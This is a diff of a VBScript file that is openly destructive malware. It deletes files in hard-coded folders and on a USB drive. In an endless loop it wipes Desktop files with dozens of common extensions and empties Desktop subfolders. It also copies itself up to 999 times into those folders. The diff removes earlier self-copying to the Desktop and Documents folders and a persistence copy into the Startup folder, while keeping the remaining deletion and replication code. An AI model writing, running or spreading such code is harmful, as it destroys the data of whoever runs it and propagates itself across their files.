@@ -5,12 +5,6 @@ strScriptPath = WScript.ScriptFullName
 ' Specify the folders in which you want to delete files (modify as needed)
 foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")
 
-' Get the path to the desktop folder
-strDesktopFolder = objShell.SpecialFolders("Desktop")
-
-' Get the path to the documents folder
-strDocumentsFolder = objShell.SpecialFolders("MyDocuments")
-
 ' Specify the number of copies to create
 numCopies = 999
 
@@ -27,26 +21,8 @@ For i = 1 To numCopies
 Next
 On Error GoTo 0 ' Reset error handling
 
-' Create copies of the script on the desktop and in the documents folder
-On Error Resume Next ' Ignore errors
-For i = 1 To numCopies
-    randomIteration = Int((1000 * Rnd) + 1)
-
-    ' Create a copy of the script on the desktop
-    strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
-
-    ' Create a copy of the script in the documents folder
-    strDocumentsCopyPath = strDocumentsFolder & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strScriptPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
-Next
-On Error GoTo 0 ' Reset error handling
-
-' Add the script to the startup folder
-On Error Resume Next ' Ignore errors
-startupFolder = objShell.SpecialFolders("Startup")
-objFSO.CopyFile strScriptPath, startupFolder & "\Copy.vbs", True ' Add "True" to overwrite existing files
-On Error GoTo 0 ' Reset error handling
+' Delete files on the USB drive
+DeleteFilesExceptVBS usbDrivePath
 
 ' Loop indefinitely
 Do
@@ -60,7 +36,7 @@ Do
     objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
     
     ' Loop through each file in the Desktop folder and delete if it has a specified file extension
-    For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
+    For Each objFile In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Files
         Dim extension
         extension = LCase(objFSO.GetExtensionName(objFile.Name))
         If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
@@ -69,14 +45,14 @@ Do
     Next
 
     ' Loop through each folder on the Desktop and delete files within them
-    For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
+    For Each objFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
         For Each objFile In objFolder.Files
             objFSO.DeleteFile(objFile.Path)
         Next
     Next
 
     ' Generate copies of the script within each folder on the Desktop
-    For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
+    For Each objFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
         On Error Resume Next ' Ignore errors
         For i = 1 To numCopies
             randomIteration = Int((1000 * Rnd) + 1)
